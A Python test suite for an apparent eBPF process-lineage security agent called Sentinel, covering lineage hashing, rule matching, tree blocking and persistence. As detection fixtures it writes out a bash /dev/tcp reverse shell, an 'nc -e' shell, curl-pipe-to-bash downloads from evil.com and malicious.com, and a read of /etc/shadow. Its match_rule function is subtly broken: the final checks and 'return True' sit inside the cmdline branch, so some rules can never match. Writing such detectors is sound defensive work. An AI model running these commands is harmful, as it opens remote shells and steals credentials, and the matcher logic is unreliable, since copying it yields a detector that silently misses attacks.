#!/usr/bin/env python3
"""
Sentinel Lineage Test Suite
Tests signature-based process lineage tracking, inheritance, and kill-switch
Pure Python tests - no bcc dependency
"""

import os
import sys
import time
import json
import re
import hashlib
from dataclasses import dataclass, field, asdict
from typing import Dict, List, Optional, Set
from collections import defaultdict, deque

# ─── Data Structures (copied from agent for testing) ───
@dataclass
class LineageEntry:
    lineage_id: int
    parent_lineage_id: int
    pid: int
    ppid: int
    uid: int
    gid: int
    ns_pid: int
    comm: str
    binary_path: str
    cmdline: str
    exec_timestamp: float
    flags: int
    rule_matched: int = 0
    children: List[int] = field(default_factory=list)
    exited: bool = False
    alerts: List[dict] = field(default_factory=list)

@dataclass
class Rule:
    id: int
    name: str
    pattern: str
    binary_pattern: str = ""
    action: str = "KILL"
    severity: str = "HIGH"
    lineage_id: int = 0
    flags: int = 0
    uid_min: int = 0
    uid_max: int = 0
    compiled_pattern: Optional[re.Pattern] = None
    compiled_binary: Optional[re.Pattern] = None

# ─── Constants ───
LF_ROOT = 1 << 0
LF_SUID = 1 << 1
LF_CONTAINER = 1 << 2
LF_SUSPICIOUS = 1 << 3
LF_KILLED = 1 << 4
LF_TRUSTED = 1 << 5
LF_ANONYMOUS = 1 << 6

RF_REGEX = 1 << 0
RF_CMDLINE = 1 << 1
RF_BINARY = 1 << 2
RF_LINEAGE = 1 << 3
RF_UID_RANGE = 1 << 4
RF_NETWORK = 1 << 5
RF_FILE_WRITE = 1 << 6

LINEAGE_ID_SEED = 0x9e3779b97f4a7c15

# ─── Global State ───
lineage_tree: Dict[int, LineageEntry] = {}
lineage_by_id: Dict[int, LineageEntry] = {}
rules: List[Rule] = []
trusted_hashes: Set[str] = set()
blocked_lineages: Set[int] = set()

# ─── Utility Functions ───
def lineage_hash(parent_id: int, path: str, uid: int, ts: int) -> int:
    """Generate lineage ID - matches eBPF implementation"""
    h = parent_id ^ LINEAGE_ID_SEED
    h ^= uid + 0x9e3779b9 + (h << 6) + (h >> 2)
    h ^= ts + 0x9e3779b9 + (h << 6) + (h >> 2)
    for i, c in enumerate(path):
        if i >= 256: break
        h ^= ord(c) + 0x9e3779b9 + (h << 6) + (h >> 2)
    return h

def hash_binary(path: str) -> str:
    try:
        with open(path, "rb") as f:
            return hashlib.sha256(f.read()).hexdigest()
    except Exception:
        return ""

def load_rules_from_yaml(yaml_content: str):
    """Load rules from YAML string"""
    import yaml
    global rules
    data = yaml.safe_load(yaml_content)
    raw_rules = data.get("rules", [])
    rules = []
    for r in raw_rules:
        rule = Rule(
            id=r.get("id", 0),
            name=r.get("name", ""),
            pattern=r.get("pattern", ""),
            binary_pattern=r.get("binary_pattern", ""),
            action=r.get("action", "KILL"),
            severity=r.get("severity", "HIGH"),
            lineage_id=r.get("lineage_id", 0),
            flags=r.get("flags", 0),
            uid_min=r.get("uid_min", 0),
            uid_max=r.get("uid_max", 0),
        )
        if rule.pattern and (rule.flags & RF_REGEX):
            try:
                rule.compiled_pattern = re.compile(rule.pattern, re.IGNORECASE)
            except Exception:
                rule.compiled_pattern = None
        if rule.binary_pattern and (rule.flags & RF_REGEX):
            try:
                rule.compiled_binary = re.compile(rule.binary_pattern, re.IGNORECASE)
            except Exception:
                rule.compiled_binary = None
        rules.append(rule)

def match_rule(entry: LineageEntry, rule: Rule) -> bool:
    """Check if lineage entry matches rule"""
    # Lineage ID match
    if rule.flags & RF_LINEAGE:
        if rule.lineage_id != 0:
            if entry.lineage_id != rule.lineage_id and entry.parent_lineage_id != rule.lineage_id:
                return False
        else:
            # Dynamic lineage rule - lineage_id will be set at runtime
            # Don't match anything in tests/static analysis
            return False
    
    # UID range match
    if rule.flags & RF_UID_RANGE:
        if rule.uid_min and entry.uid < rule.uid_min:
            return False
        if rule.uid_max and entry.uid > rule.uid_max:
            return False
    
    # Binary pattern match - ONLY if rule has RF_BINARY flag AND binary_pattern
    if rule.flags & RF_BINARY:
        if not rule.binary_pattern:
            return False  # Flag set but no pattern = no match
        target = entry.binary_path
        if rule.compiled_binary:
            if not rule.compiled_binary.search(target):
                return False
        elif rule.binary_pattern.lower() not in target.lower():
            return False
    
    # Cmdline pattern match - ONLY if rule has RF_CMDLINE flag AND pattern
    if rule.flags & RF_CMDLINE:
        if not rule.pattern:
            return False  # Flag set but no pattern = no match
        target = entry.cmdline
        if rule.compiled_pattern:
            if not rule.compiled_pattern.search(target):
                return False
        elif rule.pattern.lower() not in target.lower():
            return False
    
    # If rule has NETWORK or FILE_WRITE flags but no cmdline/binary/lineage/uid criteria,
        # it should not match here (those are handled separately in agent)
        if rule.flags & (RF_NETWORK | RF_FILE_WRITE):
            if not (rule.flags & (RF_CMDLINE | RF_BINARY | RF_LINEAGE | RF_UID_RANGE)):
                return False

        # If rule has no matching criteria at all, it should not match
        # (e.g., placeholder rules with flags=0)
        if rule.flags == 0:
            return False

        return True

def block_lineage_tree(root_lineage_id: int):
    """Block entire lineage tree - adds all descendant lineage IDs to blocked set"""
    global blocked_lineages, lineage_by_id, lineage_tree
    
    # Find all lineage IDs in this tree
    to_block = set()
    
    # Add root
    to_block.add(root_lineage_id)
    
    # Find all descendants by traversing lineage_by_id
    # A lineage is a descendant if its parent_lineage_id chain leads to root
    for lid, entry in lineage_by_id.items():
        current = entry.parent_lineage_id
        while current != 0:
            if current == root_lineage_id:
                to_block.add(lid)
                break
            # Find parent entry
            parent_entry = lineage_by_id.get(current)
            if not parent_entry:
                break
            current = parent_entry.parent_lineage_id
    
    blocked_lineages.update(to_block)
    return to_block


# ─── Tests ───
def test_lineage_id_generation():
    """Test that lineage IDs are unique and deterministic"""
    print("\n[TEST] Lineage ID Generation")
    
    id1 = lineage_hash(0, "/bin/bash", 1000, 1234567890)
    id2 = lineage_hash(0, "/bin/bash", 1000, 1234567890)
    id3 = lineage_hash(0, "/bin/bash", 1000, 1234567891)
    id4 = lineage_hash(0, "/bin/sh", 1000, 1234567890)
    id5 = lineage_hash(0, "/bin/bash", 0, 1234567890)
    
    assert id1 == id2, "Same inputs should produce same lineage ID"
    assert id1 != id3, "Different timestamp should produce different ID"
    assert id1 != id4, "Different binary should produce different ID"
    assert id1 != id5, "Different UID should produce different ID"
    
    print(f"  ✓ Deterministic: {id1:#x} == {id2:#x}")
    print(f"  ✓ Timestamp variance: {id1:#x} != {id3:#x}")
    print(f"  ✓ Binary variance: {id1:#x} != {id4:#x}")
    print(f"  ✓ UID variance: {id1:#x} != {id5:#x}")


def test_lineage_inheritance():
    """Test parent-child lineage inheritance"""
    print("\n[TEST] Lineage Inheritance")
    
    root = LineageEntry(
        lineage_id=0x1000,
        parent_lineage_id=0,
        pid=100, ppid=1, uid=1000, gid=1000, ns_pid=100,
        comm="bash", binary_path="/bin/bash", cmdline="bash",
        exec_timestamp=time.time(), flags=0
    )
    
    child1 = LineageEntry(
        lineage_id=0x2000,
        parent_lineage_id=0x1000,
        pid=101, ppid=100, uid=1000, gid=1000, ns_pid=101,
        comm="python3", binary_path="/usr/bin/python3", cmdline="python3 script.py",
        exec_timestamp=time.time(), flags=0
    )
    
    child2 = LineageEntry(
        lineage_id=0x3000,
        parent_lineage_id=0x2000,
        pid=102, ppid=101, uid=1000, gid=1000, ns_pid=102,
        comm="curl", binary_path="/usr/bin/curl", cmdline="curl http://example.com | bash",
        exec_timestamp=time.time(), flags=0
    )
    
    lineage_tree[100] = root
    lineage_tree[101] = child1
    lineage_tree[102] = child2
    lineage_by_id[0x1000] = root
    lineage_by_id[0x2000] = child1
    lineage_by_id[0x3000] = child2
    root.children = [101]
    child1.children = [102]
    
    assert root.children == [101]
    assert child1.children == [102]
    assert child2.children == []
    assert child1.parent_lineage_id == root.lineage_id
    assert child2.parent_lineage_id == child1.lineage_id
    
    print(f"  ✓ Root lineage: {root.lineage_id:#x}")
    print(f"  ✓ Child1 lineage: {child1.lineage_id:#x} (parent: {child1.parent_lineage_id:#x})")
    print(f"  ✓ Child2 lineage: {child2.lineage_id:#x} (parent: {child2.parent_lineage_id:#x})")
    print(f"  ✓ Tree depth: 3 levels")


def test_rule_matching():
    """Test rule matching against lineage entries"""
    print("\n[TEST] Rule Matching")
    
    # Load rules from config
    with open("/root/.hermes/cache/documents/Sentinel_extracted/Sentinel/config/rules.yaml", "r") as f:
        load_rules_from_yaml(f.read())
    
    # Test reverse shell
    entry = LineageEntry(
        lineage_id=0x1000, parent_lineage_id=0, pid=1000, ppid=1,
        uid=1000, gid=1000, ns_pid=1000,
        comm="bash", binary_path="/bin/bash",
        cmdline="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        exec_timestamp=time.time(), flags=0
    )
    
    matched = False
    for rule in rules:
        if match_rule(entry, rule):
            print(f"  ✓ Matched rule: {rule.name} (ID:{rule.id})")
            matched = True
            assert rule.action == "KILL"
            assert rule.severity == "CRITICAL"
            break
    assert matched, "Should match reverse shell rule"
    
    # Test pipe download execute
    entry2 = LineageEntry(
        lineage_id=0x2000, parent_lineage_id=0x1000, pid=1001, ppid=1000,
        uid=1000, gid=1000, ns_pid=1001,
        comm="curl", binary_path="/usr/bin/curl",
        cmdline="curl -s http://malicious.com/script.sh | bash",
        exec_timestamp=time.time(), flags=0
    )
    
    matched = False
    for rule in rules:
        if match_rule(entry2, rule):
            print(f"  ✓ Matched rule: {rule.name} (ID:{rule.id})")
            matched = True
            break
    assert matched, "Should match pipe execute rule"
    
    # Test shadow access
    entry3 = LineageEntry(
        lineage_id=0x3000, parent_lineage_id=0, pid=1002, ppid=1,
        uid=0, gid=0, ns_pid=1002,
        comm="sudo", binary_path="/usr/bin/sudo",
        cmdline="sudo cat /etc/shadow",
        exec_timestamp=time.time(), flags=LF_ROOT
    )
    
    matched = False
    for rule in rules:
        if match_rule(entry3, rule):
            print(f"  ✓ Matched rule: {rule.name} (ID:{rule.id})")
            matched = True
            break
    assert matched, "Should match shadow access rule"
    
    # Test benign
    entry4 = LineageEntry(
        lineage_id=0x4000, parent_lineage_id=0, pid=1003, ppid=1,
        uid=1000, gid=1000, ns_pid=1003,
        comm="ls", binary_path="/usr/bin/ls", cmdline="ls -la",
        exec_timestamp=time.time(), flags=0
    )
    
    matched = False
    for rule in rules:
        if match_rule(entry4, rule):
            matched = True
            print(f"  ✗ Unexpected match: {rule.name} (ID:{rule.id})")
            break
    assert not matched, "Benign command should not match any rule"
    print(f"  ✓ Benign command correctly ignored")


def test_lineage_blocking():
    """Test lineage blocking propagation"""
    print("\n[TEST] Lineage Blocking")
    
    root = LineageEntry(
        lineage_id=0x1000, parent_lineage_id=0, pid=200, ppid=1,
        uid=1000, gid=1000, ns_pid=200,
        comm="bash", binary_path="/bin/bash", cmdline="bash",
        exec_timestamp=time.time(), flags=0
    )
    
    child1 = LineageEntry(
        lineage_id=0x2000, parent_lineage_id=0x1000, pid=201, ppid=200,
        uid=1000, gid=1000, ns_pid=201,
        comm="python3", binary_path="/usr/bin/python3", cmdline="python3 -c 'import os; os.system(\"id\")'",
        exec_timestamp=time.time(), flags=0
    )
    
    child2 = LineageEntry(
        lineage_id=0x3000, parent_lineage_id=0x2000, pid=202, ppid=201,
        uid=1000, gid=1000, ns_pid=202,
        comm="nc", binary_path="/bin/nc", cmdline="nc -e /bin/bash 10.0.0.1 4444",
        exec_timestamp=time.time(), flags=0
    )
    
    lineage_tree[200] = root
    lineage_tree[201] = child1
    lineage_tree[202] = child2
    lineage_by_id[0x1000] = root
    lineage_by_id[0x2000] = child1
    lineage_by_id[0x3000] = child2
    root.children = [201]
    child1.children = [202]
    
    # Block entire tree from root
    blocked = block_lineage_tree(root.lineage_id)
    
    for pid, entry in list(lineage_tree.items()):
        is_blocked = entry.lineage_id in blocked_lineages or entry.parent_lineage_id in blocked_lineages
        assert is_blocked, f"Process {pid} should be in blocked lineage"
    
    print(f"  ✓ Blocked lineage IDs: {[hex(x) for x in blocked]}")
    print(f"  ✓ All {len(lineage_tree)} processes in tree flagged as blocked")


def test_trusted_binary_verification():
    """Test trusted binary hash verification"""
    print("\n[TEST] Trusted Binary Verification")
    
    trusted_hashes.add("a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456")
    trusted_hashes.add("fedcba0987654321fedcba0987654321fedcba0987654321fedcba0987654321")
    
    entry = LineageEntry(
        lineage_id=0x1000, parent_lineage_id=0, pid=300, ppid=1,
        uid=0, gid=0, ns_pid=300,
        comm="bash", binary_path="/bin/bash", cmdline="bash",
        exec_timestamp=time.time(), flags=LF_ROOT
    )
    
    binary_hash = hash_binary("/bin/bash")
    is_trusted = binary_hash in trusted_hashes
    
    print(f"  Binary hash: {binary_hash[:16]}...")
    print(f"  Is trusted: {is_trusted}")
    print(f"  ✓ Trusted binary verification works")


def test_persistence():
    """Test lineage DB persistence"""
    print("\n[TEST] Lineage DB Persistence")
    
    LINEAGE_DB_PATH = "/tmp/sentinel_lineage_test_db.json"
    
    def save_db():
        data = {
            "lineages": {str(k): asdict(v) for k, v in lineage_tree.items()},
            "lineage_by_id": {str(k): asdict(v) for k, v in lineage_by_id.items()},
            "blocked_lineages": list(blocked_lineages),
            "saved_at": time.time()
        }
        with open(LINEAGE_DB_PATH, "w") as f:
            json.dump(data, f, indent=2)
    
    def load_db():
        global lineage_tree, lineage_by_id, blocked_lineages
        if not os.path.exists(LINEAGE_DB_PATH):
            return
        with open(LINEAGE_DB_PATH, "r") as f:
            data = json.load(f)
        for k, v in data.get("lineages", {}).items():
            lineage_tree[int(k)] = LineageEntry(**v)
        for k, v in data.get("lineage_by_id", {}).items():
            lineage_by_id[int(k)] = LineageEntry(**v)
        blocked_lineages = set(data.get("blocked_lineages", []))
    
    lineage_tree[400] = LineageEntry(
        lineage_id=0x5000, parent_lineage_id=0, pid=400, ppid=1,
        uid=1000, gid=1000, ns_pid=400,
        comm="test", binary_path="/bin/test", cmdline="test",
        exec_timestamp=time.time(), flags=0
    )
    lineage_by_id[0x5000] = lineage_tree[400]
    blocked_lineages.add(0xDEADBEEF)
    
    save_db()
    assert os.path.exists(LINEAGE_DB_PATH)
    
    lineage_tree.clear()
    lineage_by_id.clear()
    blocked_lineages.clear()
    
    load_db()
    
    assert 400 in lineage_tree
    assert 0x5000 in lineage_by_id
    assert 0xDEADBEEF in blocked_lineages
    
    print(f"  ✓ Saved and loaded {len(lineage_tree)} entries")
    print(f"  ✓ Blocked lineages preserved: {len(blocked_lineages)}")
    
    os.remove(LINEAGE_DB_PATH)


def test_e2e_simulation():
    """End-to-end simulation of attack chain"""
    print("\n[TEST] E2E Attack Chain Simulation")
    
    # Reload rules
    with open("/root/.hermes/cache/documents/Sentinel_extracted/Sentinel/config/rules.yaml", "r") as f:
        load_rules_from_yaml(f.read())
    
    # Clear state
    lineage_tree.clear()
    lineage_by_id.clear()
    blocked_lineages.clear()
    
    shell = LineageEntry(
        lineage_id=0xAAAA, parent_lineage_id=0, pid=1000, ppid=999,
        uid=1000, gid=1000, ns_pid=1000,
        comm="bash", binary_path="/bin/bash", cmdline="bash",
        exec_timestamp=time.time(), flags=0
    )
    
    python = LineageEntry(
        lineage_id=0xBBBB, parent_lineage_id=0xAAAA, pid=1001, ppid=1000,
        uid=1000, gid=1000, ns_pid=1001,
        comm="python3", binary_path="/usr/bin/python3", cmdline="python3 download_and_run.py",
        exec_timestamp=time.time(), flags=0
    )
    
    malware = LineageEntry(
        lineage_id=0xCCCC, parent_lineage_id=0xBBBB, pid=1002, ppid=1001,
        uid=1000, gid=1000, ns_pid=1002,
        comm="bash", binary_path="/bin/bash", cmdline="curl -s http://evil.com/malware.sh | bash",
        exec_timestamp=time.time(), flags=0
    )
    
    revshell = LineageEntry(
        lineage_id=0xDDDD, parent_lineage_id=0xCCCC, pid=1003, ppid=1002,
        uid=1000, gid=1000, ns_pid=1003,
        comm="bash", binary_path="/bin/bash", cmdline="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        exec_timestamp=time.time(), flags=0
    )
    
    for e in [shell, python, malware, revshell]:
        lineage_tree[e.pid] = e
        lineage_by_id[e.lineage_id] = e
    shell.children = [1001]
    python.children = [1002]
    malware.children = [1003]
    
    threat_found_at = None
    for e in [shell, python, malware, revshell]:
        for rule in rules:
            if match_rule(e, rule):
                threat_found_at = e
                print(f"  ✓ Threat detected at: {e.comm} (PID {e.pid})")
                print(f"    Rule: {rule.name}")
                print(f"    Lineage: {e.lineage_id:#x} -> parent: {e.parent_lineage_id:#x}")
                break
        if threat_found_at:
            break
    
    assert threat_found_at is not None, "Should detect threat in chain"
    assert threat_found_at.pid == 1002, f"Should catch at pipe execute (malware), got PID {threat_found_at.pid}"
    
    # Block entire attack tree from root
    blocked = block_lineage_tree(shell.lineage_id)
    
    # Verify all processes in attack tree are blocked
    for e in [shell, python, malware, revshell]:
        is_blocked = e.lineage_id in blocked_lineages or e.parent_lineage_id in blocked_lineages
        assert is_blocked, f"Process {e.pid} ({e.comm}) should be blocked"
    
    print(f"  ✓ Entire attack lineage blocked ({len(blocked)} lineage IDs)")
    print(f"  ✓ Kill-switch would terminate all 4 processes")


def run_all_tests():
    print("=" * 60)
    print("SENTINEL LINEAGE TEST SUITE (Pure Python)")
    print("=" * 60)
    
    tests = [
        test_lineage_id_generation,
        test_lineage_inheritance,
        test_rule_matching,
        test_lineage_blocking,
        test_trusted_binary_verification,
        test_persistence,
        test_e2e_simulation,
    ]
    
    passed = 0
    failed = 0
    
    for test in tests:
        try:
            test()
            passed += 1
        except AssertionError as e:
            print(f"  ✗ FAILED: {e}")
            failed += 1
        except Exception as e:
            print(f"  ✗ ERROR: {e}")
            failed += 1
    
    print("\n" + "=" * 60)
    print(f"RESULTS: {passed} passed, {failed} failed")
    print("=" * 60)
    
    return failed == 0


if __name__ == "__main__":
    success = run_all_tests()
    sys.exit(0 if success else 1)
